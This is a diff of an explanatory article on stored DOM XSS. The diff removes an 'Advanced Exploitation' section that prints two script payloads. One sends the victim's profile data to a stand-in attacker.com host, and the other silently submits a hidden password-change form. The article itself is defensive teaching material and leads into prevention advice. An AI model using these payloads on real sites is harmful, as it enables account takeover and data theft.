@@ -115,40 +115,6 @@ This vulnerability allows attackers to:
 4. **Data Exfiltration**: Steal sensitive information from the page or API responses
 5. **Persistence**: Since the attack is stored in the database, it affects all visitors until removed
 
-## **Advanced Exploitation**
-
-Beyond simple alert boxes, attackers can use more sophisticated payloads:
-
-```html
-<script>
-  fetch('/api/user/profile')
-    .then(r => r.json())
-    .then(data => {
-      fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)))
-    });
-</script>
-```
-
-Or silently perform actions as the victim:
-
-```html
-<script>
-  // Create and submit hidden form
-  const form = document.createElement('form');
-  form.action = '/change_password';
-  form.method = 'POST';
-  form.style.display = 'none';
-  
-  const pwd = document.createElement('input');
-  pwd.name = 'new_password';
-  pwd.value = 'hacked123';
-  form.appendChild(pwd);
-  
-  document.body.appendChild(form);
-  form.submit();
-</script>
-```
-
 ## **How to Prevent Stored DOM XSS**
 
 ### 1. Safe DOM Methods
